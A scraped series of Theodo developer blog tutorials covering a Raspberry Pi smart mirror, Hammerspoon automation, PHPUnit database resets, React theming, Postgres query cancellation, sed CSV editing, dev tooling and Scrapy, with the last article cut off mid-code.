http://blog.theodo.fr/2017/03/getting-started-headless-on-raspberry-pi-in-10-minutes/
Install Chromium
Since Chromium Web Browser is not available for Raspbian Jessie installed on the ARMv6 RPi models, you can try kweb browser or the custom version of Chromium:

wget -qO - http://bintray.com/user/downloadSubjectPublicKey?username=bintray | sudo apt-key add -
echo ""deb http://dl.bintray.com/kusti8/chromium-rpi jessie main dev"" | sudo tee -a /etc/apt/sources.list
sudo apt-get update
sudo apt-get install chromium-browser rpi-youtube -y

Now, you can display your single page app with:

chromium --kiosk https://my.mirror.io

Fetching data
So, lets go back to initial need: display some useful data to help me choose the best transport option! Let’s go into fetching data:
My React app is composed of 3 components: Weather, Bikes & Metro which fetch data from the following APIs. You can followthis tutorialto do so, I also usedAxiosnpm module to fetch data.
First of all, I useApixu APIto collect weather information:
https://api.apixu.com/v1/forecast.json?key=token&q=Paris
which gives us current weather and forecast:

{
  ""location"": {
    ""name"": ""Paris"",
    ""region"": ""Ile-de-France"",
    ""country"": ""France"",
    ""lat"": 48.87,
    ""lon"": 2.33,
    ""tz_id"": ""Europe/Paris"",
    ""localtime_epoch"": 1515503800,
    ""localtime"": ""2018-01-09 14:16""
  },
  ""current"": {
    ""last_updated_epoch"": 1515502814,
    ""last_updated"": ""2018-01-09 14:00"",
    ""temp_c"": 6.0,
    ""temp_f"": 42.8,
    ""is_day"": 1
  },
  ""forecast"": {
    ""temp_min_c"": 4.0,
    ""temp_max_c"": 8.2,
    ""condition"": ""cloudy""
  }
}

For metro data, I preferred this non-official REST API:
https://api-ratp.pierre-grimaud.fr/v3/schedules/metros/13/guy+moquet/R?_format=json

""result"": {
  ""schedules"": [
    {
      ""message"": ""3 mn"",
      ""destination"": ""Chatillon Montrouge""
    },
    {
      ""message"": ""9 mn"",
      ""destination"": ""Chatillon Montrouge""
    }
  ]
}

Last but not least, I wanted to display how many bikes are available around my place so I usedJCDecaux APIfor a given station (you can get its ID on Citymapper for example):
https://api.jcdecaux.com/vls/v1/stations/18047?contract=Paris&apiKey=token
But…
JCDecaux is no longer in charge of bike for hire service so you will get something like this:

{
  ""error"": ""Station not found""
}

The next company, Smovengo,is working on a upcoming API which will be available in a few weeks. Just be patient 
Next steps
This is the very first version of my smart mirror and here are the next updates to come:

Real time traffic information for my roommate who is driving to work most of the time
Use the new Velib API which will be available in a few weeks
Translate it to French because French people are bad at english 

 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Jean-Philippe Dos Santos
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										
What is Hammerspoon and what can it do for me?
How often have you wanted a little something extra out of macOS, or it’s desktop environment, but felt intimidated digging into the unwieldy system APIs? Well, fret no more!
Today we will build the neat little utility illustrated in the gif above and, hopefully, inspire you to build something yourself. To do this, we will be using Hammerspoon, an open-source project, which aims to bring staggeringly powerful macOS desktop automation into the Lua scripting language.
This allows you to quickly and easily write Lua code which interacts with the otherwise complicated macOS APIs, such as those for applications, windows, mouse pointers, filesystem objects, audio devices, batteries, screens, low-level keyboard/mouse events, clipboards, location services, wifi, and more.
Having been around for a few years, it is encouraging to know that there is a vibrant community developing Hammerspoon — with features and fixes being merged nearly every day! There is also a handy collection of user submitted snippets, known as “spoons”, which you can easily begin adding to your own configuration. You’ll soon find yourself building up a personalised arsenal of productivity tools, there are few I’ve found particularly helpful:

Seal: pluggable launch bar – a viable alternative to Alfred;
Caffeine: temporarily prevent the screen from going to sleep;
HeadphoneAutoPause: play/pause music players when headphones are connected/disconnected. The reason as to why this isn’t the default behaviour is beyond me…

Getting started with Hammerspoon
If you use brew cask, you can install Hammerspoon in seconds by running the command: brew cask install hammerspoon. If you don’t use brew cask (you really should), you can download the latest release from GitHub then drag the application over to your /Applications/ folder. Afterwards, launch Hammerspoon.app and enable accessability.
Hopefully, by now you’re convinced about how powerful Hammerspoon can be. So, let’s give you a taste of how it works and dive into a code example. Having been inspired from a post I saw on /r/unixporn, we shall be creating a quick spoon which allows the user to draw a rectangle on top of the screen only to transform into a terminal window.
Create a rectangle which overlays on top of the screen, to indicate the size of the incoming terminal window:

local rectanglePreviewColor = '#81ecec'
local rectanglePreview = hs.drawing.rectangle(
  hs.geometry.rect(0, 0, 0, 0)
)
rectanglePreview:setStrokeWidth(2)
rectanglePreview:setStrokeColor({ hex=rectanglePreviewColor, alpha=1 })
rectanglePreview:setFillColor({ hex=rectanglePreviewColor, alpha=0.5 })
rectanglePreview:setRoundedRectRadii(2, 2)
rectanglePreview:setStroke(true):setFill(true)
rectanglePreview:setLevel('floating')

One of the really cool things about Hammerspoon is its ability to work alongside Open Scripting Architecture (OSA) languages, such as AppleScript. We’ll be using this to create our new terminal window, with the desired position and size:

local function openIterm()
  local frame = rectanglePreview:frame()
  local createItermWithBounds = string.format([[
    if application ""iTerm"" is not running then
      activate application ""iTerm""
    end if
    tell application ""iTerm""
      set newWindow to (create window with default profile)
      set the bounds of newWindow to {%i, %i, %i, %i}
    end tell
  ]], frame.x, frame.y, frame.x + frame.w, frame.y + frame.h)
  hs.osascript.applescript(createItermWithBounds)
end

Listen for when the user moves their mouse, so we can move and resize our rectanglePreview:

local fromPoint = nil

local drag_event = hs.eventtap.new(
  { hs.eventtap.event.types.mouseMoved },
  function(e)
    toPoint = hs.mouse.getAbsolutePosition()
    local newFrame = hs.geometry.new({
      [""x1""] = fromPoint.x,
      [""y1""] = fromPoint.y,
      [""x2""] = toPoint.x,
      [""y2""] = toPoint.y,
    })
    rectanglePreview:setFrame(newFrame)

    return nil
  end
)

Begin to capture the rectangle drawn by the user, as they hold ctrl + shift. Once released, cease capture, hide the rectangle and then open up our iTerm instance:

  local flags_event =hs.eventtap.new(
  { hs.eventtap.event.types.flagsChanged },
  function(e)
    local flags = e:getFlags()
    if flags.ctrl and flags.shift then
      fromPoint = hs.mouse.getAbsolutePosition()
      local newFrame = hs.geometry.rect(fromPoint.x, fromPoint.y, 0, 0)
      rectanglePreview:setFrame(newFrame)
      drag_event:start()
      rectanglePreview:show()
    elseif fromPoint ~= nil then
      fromPoint = nil
      drag_event:stop()
      rectanglePreview:hide()
      openIterm()
    end
    return nil
  end
)
flags_event:start()

And that’s all it takes!
Stepping into the future
Feel free to check out my Hammerspoon config on GitHub, where you can find the coalesced version of the example above, along with my (upcoming) other spoons.
If you fancy giving a shot at writing your own spoons, here are a couple ideas to help get your creativity flowing:

Move window focus directionally using the VIM movement keys (HJKL).
When Spotify begins to play a new song, display an alert with the new song title, artist, etc…
Inter-process communication and a simple HTTPServer enable you to trigger Hammerspoon functionality from pretty much any environment.

Fun fact: the name Hammerspoon is derived from itself being a “fork” of its lightweight predecessor Mjölnir (that being the name of Thor’s hammer 🔨).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Braden Marshall
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Having independent functional tests is a good practice recommended by many developers. It allows you save a great deal of time; and it is well known, time is money!
Why
If your tests are not independent, it means that the execution of one test can impact the result of the following tests. Dependent tests can in fact fail randomly depending on the order of execution. 
I started working on a small project with a small amount of tests and I did not notice the problem at first. But as we added features, the number of tests increased significantly. And they started failing randomly. The bigger the project, the more difficult it is to understand why tests fail. We lost hours trying to find out the root cause of the failures. Indeed, the cause was not in the failing tests itself, but the failure was due to the execution of one test before. It thus took us a lot of time and energy to maintain our tests on a daily basis. 
Therefore, we decided to solve the problem and make our tests independent in a quick and simple way : reset the database between each test to make them start with a clean set of data. We set one constraint: to not impact the performances !
Let’s practice
As I mentioned before, in order to make our tests independent we chose to reset the database before each test using a dump
file. Here are the two main steps of the process:


Create an sql dump from your test database: To run your functional tests, you need to create a database. Right after this
set up, create a dump of it :


mysqldump -u $USER -h $HOST -p $PASSWORD $BDD_NAME > dump_db_test.sql


Reset your database before each test: Once the dump is created, we will use it to reset the database. You can create
an AbstractBaseTestCase.php extending the \PHPUnit_Framework_TestCase. Every functional test file should extend this file. In this file, create a setUp() method which will be run before each of your tests. This method will execute the command to reset the database with the dump file created before :


abstract class AbstractBaseTestCase extends \PHPUnit_Framework_TestCase
    {
        public function setUp()
        {
            $importCommand =
        mysql -h mysqlHost -u mysqlUserName -p mysqlPassword mysqlDatabaseName < mysqlImportFilename;

            exec($importCommand);
        }
    }
Before executing one functional test, this method is executed and it cleans the database. The following test then uses a new set of data and the previous modifications of the database do not impact the running test.
Going further

As you may have noticed, each time you’re using a plaintext password in the command line, a warning is printed in the console.
To avoid this you can set up the password as an environment variable.
Export MYSQL_PWD=’mysqlPassword’

As a quick solution, we decided to use the same database for each test. It is possible to improve this model and use fixtures
to load before each test only the ones needed to run the tests.


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Sophie Moustard
  			
  				  			
  		
    
			

									"
"
										As a web developer you may have already worked on a project where you had a single web application that was used by several different clients. The app would use a single code base but then it would need to have several variants, each personalized for a specific client:

you may need to change the look and feel of the app (turquoise color theme background instead of a red one, text aligned on the right instead of left, different fonts and illustrations)
the API calls you are making may vary depending on the client: each client could want to to have his own wording and you would need to fetch different i18n key-values depending on the client.

Imagine you develop a ticket selling platform and you offer a ticket selling app that is integrated in websites of your clients that include theaters, sports organisations and art galleries. You will most likely need to change the design and layout of the app for each of the clients so that it corresponds to the look and feel of their website.
In this article, I will show you how to have several personalized versions of your app while keeping a single code base.

We will begin with a simple ReactJS poll app styled using a styled-components theme.
Then we will create a second version of the app by adding another style theme and some structural differences.
Lastly we will configure the build so that we are able to switch between the two versions of the app.

To help you easily set up the project there is a companion repository.
Initializing the project and creating a basic app
Start by checking out the project and installing the required packages:
git clone https://github.com/invfo/theming-with-webpack.git
cd theming-with-webpack
git checkout 514f5fd //checkout the commit pointing to the first version of the app
npm install
  
Then start the development server: npm start and go to http://localhost:8080 in the browser. You should see the following poll with two options and a submit button.

Customizing the app
We will now create a second version of this polling app.
Changing the look and feel
Begin by adding a second theme and a switch between two themes based on a THEME variable (which we will define later):
// index.js
const advancedTheme = {
  background: 'linear-gradient(#68C5DB, #E0CA3C)',
  button: {
    border: '3px black dotted',
    borderRadius: '23px',
    fontSize: '30px',
    marginTop: '17px',
    padding: '5px 10px',
  },
};
const theme = THEME === 'advanced' ? advancedTheme : basicTheme;
  
Pass the new theme to the ThemeProvider:
<ThemeProvider theme={theme}> // index.js
  
Add a Title component and display it based on the THEME variable :
// index.js
const Title = ({children}) => <h1>{children}</h1>

class App extends React.Component {
  render() {
    return (
      <ThemeProvider theme={theme}>
        <Wrapper>
          { THEME === 'advanced' && <Title>Make your choice!</Title>}
          ...
  
Checkout the corresponding commit in the companion repository to see other minor changes that should be made.
Setting up the THEME variable
To be able to switch between the two app versions we need to define the THEME variable which we will wire to an environment variable of the same name.
Begin by setting the THEME environment variable at build time and making it available in our app.
Add a build command for each app version. These commands will set the THEME environment variable to either red or blue :
// package.json
""scripts"": {
  ""start:basic"": ""cross-env THEME=basic webpack-dev-server"",
  ""start:advanced"": ""cross-env THEME=advanced webpack-dev-server""
}
  
You may wonder “’Cross-env’? Why not simply use THEME=red webpack-dev-server?”. This option would work fine on most OSs, but can be troublesome if you are using Windows.
Cross-env allows you to define environmental variables without worrying about particularities of the platform you are using. Install it: npm install --save-dev cross-env
Finally let’s put together everything we did in previous steps: make the THEME environment variable available in the app code
// webpack.config.js
plugins: [
  new webpack.DefinePlugin({
    THEME: JSON.stringify(process.env.THEME),
  }),
]
  
DefinePlugin enables you to create global constants that are configured during compilation. Here we’re using it to define a THEME variable that is usable in our app’s code. Its value will be equal to the THEME environment variable set using cross-env.
For more info see the official webpack doc.
Now try out one of the new builds: npm run start:advanced
You should see the new version of the app:



To view the old version, run npm run start:simple
You can always get the latest app code version from the companion repository.
To sum up
So far we have learned how to:

Define your app’s style and manage several CSS themes using styled-components and its ThemeProvider (check out the official docs for more information)
Set up environment variables for the build using cross-env
Make previously set environment variables available in your app’s code using webpack’s DefinePlugin
Modify app’s content based on an environment variable value (on the example of <input>)

Using the above concepts you can personalize your ReactJS app and have several builds, each of them generating an app with a specific look.
The proposed method is suitable when the personalization you need to make:

concerns style or
basic html structure (like changing input types or adding / hiding certain elements).

As with any other concept, you should not blindly apply it on your project but rather ask yourself if this is the most suitable solution. The proposed way of personnalizing can be used when different app variants are quite similar. But if your app versions are totally different, having many if in your code will make it hard to maintain. In this case opt for another solution, for example having a separate “main” file for each version.
Have you already worked on a ReactJS app with several themes? How did you implement it?
Share your experience in the comments below or simply let me know if you have any questions or remarks!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Darya Talanina
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Have you ever accidentally run a blocking migration on your Postgres database? Here’s how to fix it in under 1 minute:
First, connect to your database instance.
Now, run the query: SELECT pid, query_start, query FROM pg_stat_activity
This will return a table listing all the processes running on the database, with the date they started and the query.
It should be easy to identify the pid (process id) of the blocking query
Now run SELECT pg_cancel_backend([pid]) to cancel that transaction
Congrats, you are done!
Finally, you fool! If you want to avoid table locks you should avoid the following types of migration:

Adding a new column with a default value
Change the type of a column
Adding a new non nullable column
Adding a column with a uniqueness constraint

 What exactly are we doing here? 
The table in Postgresql called pg_stat_activity is a record of all the processes currently running on the database at that moment. We use this to find the process ID of the thread controlling the overrunning transaction – we then use pg_cancel_backend function to cancel whatever process is running it.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Josh Warwick
  			
  				  			
  		
    
			

									"
"
										Recently I needed to transform a csv file with some simple processing. If you want to transform a file line by line, replacing a few things, deleting a few others, regular expressions are your friend.
Sed is a unix command line utility for modifying files line by line with regular expressions. It’s simpler than awk, and works very similarly to the vim substitution you may be vaguely familiar with.
We’re going to take a csv file and do the following with regex + sed:

Delete some rows that meet a condition
Delete a column (alright, I admit excel’s not bad for this one)
Modify some cells in the table
Move some data to its own column

We’ll be using this mock csv file data set:

name;id;thumbnail;email;url;admin;enabled
Dan Smith;56543678;dan_profile.jpg;dan@test.com;http://site.com/user/dan;false;true
James Jones;56467654;james_profile.png;james@test.com;http://site.com/user/james;false;true
Clément Girard;56467632;clement_profile.png;clement@test.com;http://site.com/user/clement;false;false
Jack Mack;56485367;jack_profile.png;jack@test.com;http://site.com/user/jack;true;false
Chris Cross;98453;chris_profile.png;chrisk@test.com;http://site.com/user/chris;true;true

Removing some users
First let’s remove users who are not enabled (last column == false). Sed lets us delete any line that return a match for a regex.
The basic structure of a sed command is like this:
sed 's/{regex match}/{substitution}/' <input_file >output_file
There’s also a delete command, deleting any line that has a match:
sed '/{regex match}/d' <input_file >output_file
Let’s use it
sed '/false$/d' <test.csv >output.csv

That command deletes these line in the csv:

Clément Girard;56467632;clement_profile.png;clement@test.com;http://site.com/user/clement;false;false
Jack Mack;56485367;jack_profile.png;jack@test.com;http://site.com/user/jack;true;false

Some of our users also have an old user Id (only 5 digits). Let’s delete those users from our csv too.
sed -r '/;[1-9]{5};/d' <test.csv >output.csv

That command deletes this line in the csv:

Chris Cross;98453;chris_profile.png;chrisk@test.com;http://site.com/user/chris;true;true

Here we’re using the OR syntax: []. This means that the next character in the match will be one of the chars between the braces, in this case it’s a range of possible digits between 1 and 9.
We’re also using the quantifier {}, it repeats the previous character match rule 5 times, so will match a 5 digit number.
Note we added the -r flag to sed so that we could use regex quantifier. This flag enabled extended regular expressions, giving us extra syntax.
Removing a column
Next we want to remove the admin column. Removing the ‘admin’ column title is easy enough, but let’s use regex to remove the data. Our csv has 2 boolean columns, admin and enabled, we want to match both of these, and replace the match with just the ‘enabled column’, which we want to keep.
sed -r 's/(true|false);(true|false)$/\2/' <test.csv >output.csv

In this example we’ve used capture groups. By surrounding a match in parentheses, we can save it to a variable – the first capture is saved to ‘\1’, the second to ‘\2’ etc.
In the substitution section of our sed string, we replaced the entire match with capture group ‘\2’. In other words we’ve replaced the final two columns in each row with just the final column, thus removing the second-to-last column from the csv.
We’ve also used the pipe ‘|’ as an OR operator, to match ‘true’ or ‘false’.
We’re left with a csv that looks like this:

name;id;thumbnail;email;url;enabled
Dan Smith;56543678;dan_profile.jpg;dan@test.com;http://site.com/user/dan;true
James Jones;56467654;james_profile.png;james@test.com;http://site.com/user/james;true

Modifying cells in the table
Next we’re going to modify the url column to store the relative url rather than the absolute path. We can use a regex like this:
sed 's_http:\/\/site[.]com\/\(.*\)_\1_' <test.csv >output.csv
This is very difficult to read because we have to escape each forward slash in the url with a backslash. Fortunately, we can change the sed delimiter from a forward slash to an underscore. This means we don’t have to escape forward slashes in the regex part of our sed command:
sed -r 's_http://site[.]com/(.*)_\1_' <test.csv >output.csv
That’s much more readable!

Here we match any characters after the base url using .* (this will match everything after the base url in the row). We save that in a capture group, so we now have a string starting with the relative url. By substituting the match with this, we’ve replaced the full url with the relative url.
We’re left with a csv that looks like this:

name;id;thumbnail;email;url;enabled
Dan Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true
James Jones;56467654;james_profile.png;james@test.com;user/james;true

Moving data to its own column
Finally, let’s take a column and split it into 2, moving some of its data to the new column. Let’s replace the name column with ‘first name’ and ‘last name’. We can start by renaming the headers in the first row, then use sed + regex to split each row in our csv in 2 automatically!
We could start with this:
sed -r 's/^([a-zA-Z]* )/\1;/' <test.csv >output.csv

Here we use OR square bracket [] notation again. In this case we match a character in a range of upper or lower case alphabetical characters. On Ubuntu Linux, this matches international alphabet characters like é, but this depends on your environment.
We save everything up to a space character (which delimits the first name from the last name) into a capture group and substitute it with itself plus a ‘;’ – thus moving first name into its own column.
The problem with this is our first name is left with a trailing space character before the column delimiter (;). It would look like this:

first name;last name;id;thumbnail;email;url;enabled
Dan ;Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true
James ;Jones;56467654;james_profile.png;james@test.com;user/james;true

Instead, we can do something like this:
sed -r 's/^([a-zA-Z]*)( )(.*)$/\1;\3/' <test.csv >output.csv
This matches the space character, but also saves it into capture group ‘\2’. We then substitute the whole match with \1;\3 – effectively putting everything back together without the space, and putting a ‘;’ character in its place. We now have our new columns, first name and last name.
There’s actually an even easier solution than this, we just replace the first empty space in each row with a ‘;’ like this:
sed -r 's/ /;/' <test.csv >output.csv
That was fast and easy!
We’re left with a csv that looks like this:

first name;last name;id;thumbnail;email;url;enabled
Dan;Smith;56543678;dan_profile.jpg;dan@test.com;user/dan;true
James;Jones;56467654;james_profile.png;james@test.com;user/james;true

With only a few commands, we’ve managed to transform a csv from our terminal.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Daniel Leary
  			
  				  			
  		
    
			

									"
"
										When I first arrived at Theodo, my whole developer world was shaken. I used to work in a robotics company, developing in C++ and Python with a Ubuntu machine, deploying on a Debian environment. And within a week, I was asked to develop new features in Javascript, on a MacBook, that needed to be deployed on an iPhone 8 and a Nexus 5. I had no clue what tools I needed to use. I was not even able to install a simple thing on that stupid Mac that did not know my dear apt-get. But I still had to work, so I followed the guidelines of my new colleagues, installing dozens of things whose purpose were unknown to me.
Only a few days later did I realise that, actually, I had already used each one of the tools I was told to install. But different ones, for different platforms, and different languages. The principles were the same, the purposes were the same, but the names were not. And when I understood that, everything became much simpler.
So today, I offer to take you on a trip. A trip through a development project. And for each tool that we will encounter on that journey, we will see which one is used depending on the platform, the programming language, or the project nature.
Are you ready?
Then buckle up!

Getting your environment ready
All right, turn on your computer, and let’s get started. You just arrived at your new job, and you got your machine, but have no idea how to install on it the stuff you are supposed to use.
It usually comes in two flavours.
Compiled executables

Those executables are binary files, specifically made to be read by a specific system (OS and CPU architecture). In other words, you cannot use the same binary files on different machines, which is why you will always need to use something specific to YOURS. The consequence is that a developer must find a way to make binary files available for every supported system.
And you need to find where they are. To make this easier, each platform provides a package manager, a tool made to install so called “packages”. A package is an archive containing all the files needed for installation. The package manager knows where to look and automatically downloads the package upon request.
Those binaries are generally installed “globally”, in the “system” part of the filesystem (/usr/lib, /Library, C://, …). Any project on your machine will have access to it (that’s cool, right?). The negative part is that you usually can have only one version installed (so if you need two different versions for two different projects, it might be painful).











Package manager
apt-get
Homebrew
Chocolatey


Executables go in
/usr/bin
<PKG-ROOT>/bin



Libraries go in
/usr/lib
<PKG-ROOT>/lib



Headers go in
/usr/include
<PKG-ROOT>/include



Resources go in
/usr/share
<PKG-ROOT>/share



Natively installed
Yes
No
No


Comments

PKG-ROOT is /usr/local/Cellar/<package>
Symbolic links are then added in
/usr/local/bin
/usr/local/lib
/usr/local/include
/usr/local/share
for each package
There are many different installation rules. You can find more details here.



Uncompiled code

Code can sometimes be directly executed without being compiled, using a program called an interpreter. Thanks to that, this code is not dependent of the machine it is run on, only of the language it is written into, and the interpreter version. It is then much more interesting for the developers to distribute their product via package managers related to the language they use rather than the platform you are using. Another difference is that these package managers use a repository containing the packages which can be installed, instead of storing them somewhere and pointing them out by a entry in a text file. Those packages are usually installed locally (directly in the project folder), so that only this project can use it. The good part is that you can use different versions of the same package for different projects.




Package manager
Main registry





pip
https://pypi.python.org/pypi



yarn
https://registry.yarnpkg.com



composer
https://packagist.org/packages/



maven
https://mvnrepository.com/artifact/



gem
https://rubygems.org/gems/







Packages go in
Comments





A global folder on your system 
pip stores packages in the root filesystem by default, in the user filesystem upon request. To store packages within the project, you need to use the virtualenv package



./node_modules
For NodeJS also exists npm, which actually is the official one. Both are similar and works the same way, although yarn seems to be way faster



./vendor




./target/dependency/BOOT-INF/lib




A global folder on your system 
gem also installs packages in a folder unrelated to your project, but you can choose which one it will be. To install packages in a folder specific to your project, you can use bundler



Handling cross-platform development

Now, let’s say you are working on a project where your target is different from your development environment.
This is actually extremely common. You can be working on a website for instance (you probably don’t have the exact same configuration as the server machine), or you could be developing a mobile application, or a library for a robot. You could also be working on a program that should be runnable on Mac AND Windows, etc..
To test that your product actually works on the target environment, you will need to use emulation tools (or have an equal number of devices and targets, which is not always practical). For mobile development, there are powerful simulators which allow the testing of several shapes of mobiles and several OS versions. They also allow the emulation of mobile-specific inputs, like GPS.
The ones I know about (there might be others):

XCode‘s Simulator (iOS)
Android Studio’s emulator (Android)
GenyMotion (Android)

For “computer” environments, you can use virtual environments. They can be created by:

Vagrant (virtual machine handler)
Docker (virtual environment running on your real machine)

Docker is lighter than a virtual machine, but provides less insulation (although this is not important in most projets). Also, only a Linux environment can be emulated. Vagrant is actually more a virtual machine manager. It is based on programs like VMWare and VirtualBox to build virtual machines from a script.
To know more about the difference between Docker and Virtual machines, you can have a look at this blog article which gives a generic explanation of the difference or this StackOverflow’s answer giving more technical details.
Testing your feature

You now have everything you need to install the dependencies of your project. You are ready to go, ready to develop on any platform, in any language. But after finishing your first feature, a new problem arises: tests.
What are you supposed to use to test your code on this alien environment? Well thankfully, as you would expect, there is always at least one unit test library for each language.




Framework





pytest



jest, mocha, chai



junit



gtest (among many others)



phpunit



(built-in)



There are of course several other kinds of tests (end to end, integration, api, stress, static type) but they are not as widely represented as unit tests, because their value relies more on the language, and what it is used for.
For instance, static type tests on c++ or java is useless (because proper typing is assured by the language itself). If you develop a graphical interface in python, you will need to use a specific framework, which will (or will not) provide end to end testing capabilities. But Python won’t.
Another thing you might want to do is to make sure your project works under different versions of the language you use. To test that, you can use a language’s version manager if it exists (so you don’t need to use several VMs/docker images with different languages versions).



Language
Version manager





nvm



rvm



pyenv



This feature is also widely used for solely development purposes, if different projects you are working on need different language versions. This helps you to keep a clean environment and is very handy.
Deploying the feature
Alright, your tests are fine, your code has been approved by a peer, now you need to push it into production.
Until now, we did not really care about the type of project you were working on (installing dependencies and testing your code is something to do in every project). But the deployment will be much more tied to the nature of the project. Besides, not only do we need to deploy our new feature, we also need to make sure our dependencies are available on the target machine.
I am working on a library for others to use
Here, “deploying to production” means “making the newest version available for download and installation”. Do you remember what we said about package managers? That they help you install software made by others? Well, now you are on the other side of the mirror. So you need to ask yourself one simple question:

Am I trying to distribute compiled code, which is therefore platform specific?

Whichever the answer, you will need to look for how to build a package for one or more specific package managers.
The answer will only guide you in your selection. Platform-wise package managers, or language-related package managers?
I am working on a web application
In this case, deploying to production means sending the newest version of your product on the server hosting it. The number of possible tools’ combinations is too huge to be listed here, so only the main ones will be described.

Pack your application in a docker, send it to a docker host using docker api, then start your application with

Docker Compose (starts one or more containers on one host)
Docker Swarm (starts one or more containers on several hosts)
Kubernetes (very close to docker swarm, developed by Google)
Or one of these



To know more, you can find a pretty good comparison of Kubernetes and Docker Swarm here.

Configure a remote machine to download your application (from github for instance) and its dependencies (also called “provisioning”)

Chef
Capistrano
Shipit (Alternative to capistrano in JS)
Ansible
and many others



By the way, although Chef and Capistrano are perfectly capable of deploying your app AND configuring the host server by themselves, it seems better to actually use both, as explained in this article.
I am working on a mobile application
In this situation, you need to package your app and send it to a storing server. It is actually pretty similar to providing a library, except the tools use to package and upload the app are quite different. The main one I encounter is Fastlane
And that’s it
Hey, you made it. You actually managed to install your dependencies, on your machine and on the target system. You developed your feature using an emulated environment, and tested it using an appropriate unit test framework. Finally, you deployed your newly added feature to prod.
Congratulations!
You managed to work efficiently, even in an alien environment.
You can be proud!


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Surya Ambrose
  			
  				  			
  		
    
			

									"
"
										Scraping a website means extracting data from a website in a usable way.
The ultimate goal when scraping a website is to use the extracted data to build something else.
In this article, I will show you how to extract the content of all existing articles of Theodo’s blog with Scrapy, an easy-to-learn, open source Python library used to do data scraping.
I personally used this data to train a machine learning model that generates new blog articles based on all previous articles (with relative success)!
Important:
Before we start, you must remember to always read the terms and conditions of a website before you scrape it as the website may have some requirements on how you can legally use its data (usually not for commercial use).
You should also make sure that you are not scraping the website too aggressively (sending too many requests in a short period of time) as it may have an impact on the scraped website.
Scrapy
Scrapy is an open source and collaborative framework for extracting data from websites.
Scrapy creates new classes called Spider that define how a website will be scraped by providing the starting URLs and what to do on each crawled page.
I invite you to read the documentation on Spiders if you want to better understand how scraping is done when using Scrapy’s Spiders.
Scrapy is a Python library that is available with pip.
To install it, simply run pip install scrapy.
You are now ready to start the tutorial, let’s get to it!
Extracting all the content of our blog
You can find all the code used in this article in the accompanying repository.
Get the content of a single article
First, what we want to do is retrieve all the content of a single article.
Let’s create our first Spider. To do that, you can create an article_spider.py file with the following code:
import scrapy


class ArticleSpider(scrapy.Spider):
    name = ""article""
    start_urls = ['http://blog.theodo.fr/2018/02/scrape-websites-5-minutes-scrapy']

    def parse(self, response):
        content = response.xpath("".//div[@class='entry-content']/descendant::text()"").extract()
        yield {'article': ''.join(content)}

Let’s break everything down!
First we import the scrapy library and we define a new class ArticleSpider derived from the Spider class from scrapy.
We define the name of our Spider and the start_urls, the URLs that our Spider will visit (in our case, only the URL of this blog post).
Finally, we define a parse method that will be executed on each page crawled by our spider.
If you inspect the HTML of this page, you will see that all the content of the article is contained in a div of class entry-content.
Scrapy provides an xpath method on the response object (the content of the crawled page) that creates a Selector object useful to select parts of the page.
In the xpath method, it will create a Selector based on the xpath language.
Using this method, we find the list of the text of all the descendants (divs, spans…) contained in the entry-content block.
We then return a dictionary with the content of the article by concatenating this list of text.
Now, if you want to see the result of this Spider, you can run the command scrapy runspider article_spider.py -o article.json.
When you run this command, Scrapy looks for a Spider definition inside the file and runs it through its crawling engine.
The -o flag (or --output) will put the content of our Spider in the article.json file, you can open it and see that we indeed retrieved all the content of the article!
Navigate through all the articles of a page
We now know how to extract the content of an article.
But how can we extract the content of all articles contained on a page ?
To do this, we need to identify the URLs of each article and use what we learned in the previous section to extract the content of each article.
We could use the same Spider as the last section and give all the URLs to the start_urls attribute but that would take a lot of manual time to retrieve all the URLs.
In a blog page like this one, you can go to an article by clicking on the title of the article.
We must thus find a way to visit all of the articles by clicking on each titles.
Scrapy provides another method on the response object, the css method that also creates a Selector object, but this time based on the CSS language (which is easier to use than xpath).
If you inspect the title of an article, you can see that it is a link with a a tag contained in a div of class entry-title.
So, to extract all the links of a page, we can use the selector with response.css('.entry-title a ::attr(""href"")').extract().
Now let’s put two and two together and create a page_spider.py file with this code:
import scrapy


class PageSpider(scrapy.Spider):
    name = ""page""
    start_urls = ['http://blog.theodo.fr/']

    def parse(self, response):
        for article_url in response.css('.entry-title a ::attr(""href"")').extract():
            yield response.follow(article_url, callback=self.parse_article)

    def parse_article(self, response):
        content = response.xpath("".//div[@class='entry-content']/descendant::text()"").extract()
        yield {'article': ''.join(content)}

What our PageSpider is doing here is start on the homepage of our blog and identify the URLs of each article in the page using the css method.
Then, we use the follow method on each URL to extract the content of each article using the parse_article callback (directly inspired from the first part).
The follow method allow us to do a new request and apply a callback on it, this is really useful to do a Spider that navigates through multiple pages.
If you run the command scrapy runspider page_spider.py -o page.json, you will see in the page.json output that we retrieved the content of each article of the homepage.
You may notice one of the main advantages about Scrapy: requests are scheduled and processed asynchronously.
This means that Scrapy doesn’t need to wait for a request to be finished and processed, it can send another request or do other things in the meantime.
Navigate through all the pages of the blog
Now that we know how to extract the content of all articles in a page, let’s extract all the content of the blog by going through all the pages of the blog.
On each page of the blog, at the bottom of the page, you can see an “Older posts” button that links to the previous page of the blog.
Therefore, if we want to visit all pages of the blog, we can start from the first page and click on “Older posts” until we reach the last page (obviously, the last page of the blog does not contain the button).
The “Older posts” button can be easily identified using the same css method as the previous section with response.css('.nav-previous a ::attr(""href"")').extract_first().
Now let’s retrieve all the content of our blog with a blog_spider.py:
import scrapy


